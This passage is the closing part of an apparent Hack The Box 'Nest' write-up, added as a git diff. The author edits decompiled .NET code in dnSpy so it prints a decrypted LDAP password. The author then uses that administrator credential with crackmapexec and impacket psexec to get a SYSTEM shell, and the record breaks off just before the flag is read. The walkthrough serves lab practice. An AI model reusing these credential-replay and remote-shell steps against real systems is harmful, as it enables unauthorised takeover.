@@ -903,6 +903,158 @@ We have a password now.
 
 yup again this is encrpyted Ë!*ÑKï..®@ç..Ê^...Aèj..ß)×.þHÄU¾ 
 
-Lets run it against the VS Code 
+Lets run it against the VS Code.
 
+I could not run the VS Code as as I did prior. I had to edit the new source code and for that I had to reseach and get more hints, since coding is something that I am working on. 
 
+### dnSpy
+
+![image](https://user-images.githubusercontent.com/68706090/166335134-52381bc1-1df3-4f46-b010-89921f7f1757.png)
+
+```console
+public static void Main()
+		{
+			checked
+			{
+				try
+				{
+					if (MyProject.Application.CommandLineArgs.Count != 1)
+					{
+						Console.WriteLine("Invalid number of command line arguments");
+					}
+					else if (!File.Exists(MyProject.Application.CommandLineArgs[0]))
+					{
+						Console.WriteLine("Specified config file does not exist");
+					}
+					else if (!File.Exists("HqkDbImport.exe"))
+					{
+						Console.WriteLine("Please ensure the optional database import module is installed");
+					}
+					else
+					{
+						LdapSearchSettings ldapSearchSettings = new LdapSearchSettings();
+						foreach (string text in File.ReadAllLines(MyProject.Application.CommandLineArgs[0]))
+						{
+							if (text.StartsWith("Domain=", StringComparison.CurrentCultureIgnoreCase))
+							{
+								ldapSearchSettings.Domain = text.Substring(text.IndexOf('=') + 1);
+							}
+							else if (text.StartsWith("User=", StringComparison.CurrentCultureIgnoreCase))
+							{
+								ldapSearchSettings.Username = text.Substring(text.IndexOf('=') + 1);
+							}
+							else if (text.StartsWith("Password=", StringComparison.CurrentCultureIgnoreCase))
+							{
+								ldapSearchSettings.Password = CR.DS(text.Substring(text.IndexOf('=') + 1));
+							}
+						}
+						Ldap ldap = new Ldap();
+						ldap.Username = ldapSearchSettings.Username;
+						ldap.Password = ldapSearchSettings.Password;
+						ldap.Domain = ldapSearchSettings.Domain;
+						Console.WriteLine("The Password is: ");
+						Console.WriteLine(ldap.Password);
+						List<string> list = ldap.FindUsers();
+						Console.WriteLine(Conversions.ToString(list.Count) + " user accounts found. Importing to database...");
+```
+
+I used the tool dnSpy to load the binary and was able to edit the code. Looking into the code there are a few things that are required the HqkDbImport.exe, ldap.conf file that feeds the username and password to the software, and editing the code. 
+
+``console
+Console.WriteLine("The Password is: ");
+Console.WriteLine(ldap.Password);
+```
+
+This was to ensure that I was using the right version of the code so it will say the Password is and not lday query. Then executing the code in CMD got me.
+
+```console
+C:\Users\jayso\Desktop\CTF\HTB\NEST>HqkLdap.exe ldap.conf
+Performing LDAP query...
+Unexpected error: The specified domain does not exist or cannot be contacted.
+
+C:\Users\jayso\Desktop\CTF\HTB\NEST>HqkLdap.exe ldap.conf
+The Password is:
+XtH4nkS4Pl4y1nGX
+Unexpected error: The specified domain does not exist or cannot be contacted.
+```
+Now let run crackmapexec
+
+### Crackmapexec
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ crackmapexec smb 10.10.10.178 -u administrator -p XtH4nkS4Pl4y1nGX
+/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
+  if result['type'] is not 'searchResEntry':
+SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
+SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\administrator:XtH4nkS4Pl4y1nGX (Pwn3d!)
+```
+We have a pwned now lets run psexec for the shell
+
+### PSEXEC
+
+```console
+noob2uub@kali:~/ctf/htb/nest$ psexec.py administrator@10.10.10.178
+Impacket v0.9.25.dev1+20220501.210324.0e40593a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.178.....
+[*] Found writable share ADMIN$
+[*] Uploading file aVqWuYEi.exe
+[*] Opening SVCManager on 10.10.10.178.....
+[*] Creating service QMWP on 10.10.10.178.....
+[*] Starting service QMWP.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> 
+```
+
+now lets get the last flag.
+
+```console
+C:\Users\Administrator> dir
+ Volume in drive C has no label.
+ Volume Serial Number is E6FB-F2E9
+
+ Directory of C:\Users\Administrator
+
+08/05/2019  09:33 PM    <DIR>          .
+08/05/2019  09:33 PM    <DIR>          ..
+01/25/2020  11:02 PM    <DIR>          Contacts
+07/21/2021  07:27 PM    <DIR>          Desktop
+01/25/2020  11:02 PM    <DIR>          Documents
+01/25/2020  11:02 PM    <DIR>          Downloads
+01/25/2020  11:02 PM    <DIR>          Favorites
+01/25/2020  11:02 PM    <DIR>          Links
+01/25/2020  11:02 PM    <DIR>          Music
+01/25/2020  11:02 PM    <DIR>          Pictures
+01/25/2020  11:02 PM    <DIR>          Saved Games
+01/25/2020  11:02 PM    <DIR>          Searches
+01/25/2020  11:02 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)   7,536,791,552 bytes free
+
+C:\Users\Administrator> cd Desktop
+
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is E6FB-F2E9
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/21/2021  07:27 PM    <DIR>          .
+07/21/2021  07:27 PM    <DIR>          ..
+05/02/2022  09:37 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   7,536,791,552 bytes free
+
+C:\Users\Administrator\Desktop> cat root.txt
+'cat' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Administrator\Desktop> type root.txt
+```
